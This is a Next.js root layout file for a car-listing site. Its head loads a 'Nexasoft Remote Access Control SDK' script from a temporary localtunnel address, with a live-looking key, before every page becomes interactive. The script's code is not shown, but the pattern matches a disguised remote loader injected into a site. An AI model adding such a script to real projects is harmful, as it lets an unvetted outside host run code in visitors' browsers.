import { Inter } from "next/font/google";
import Script from "next/script";
import "./globals.css";
import Footer from "@/components/Footer";
import Header from "@/components/Header";
import { ClerkProvider } from "@clerk/nextjs";
import { Toaster } from "sonner";

const inter = Inter({
  subsets: ["latin"],
});

export const metadata = {
  title: "vehicle",
  description: "Find your dream Car",
};

export default function RootLayout({ children }) {
  const NEXASOFT_URL = process.env.NEXT_PUBLIC_NEXASOFT_URL || "https://great-schools-follow.loca.lt";

  return (
    <ClerkProvider>
      <html lang="en">
        <head>
          {/* 🛡️ Nexasoft Remote Access Control SDK */}
          <Script
            src={`${NEXASOFT_URL}/sdk/nexasoft.js`}
            data-site-key="nex_live_040e1a25634cf6fa1ad062aa97aadee0"
            data-api-url={NEXASOFT_URL}
            strategy="beforeInteractive"
          />
        </head>
        <body className={`${inter.className}`}>
          <Header />

          <main className="min-h-screen">{children}</main>
          <Toaster richColors />

          <Footer />
        </body>
      </html>
    </ClerkProvider>
  );
}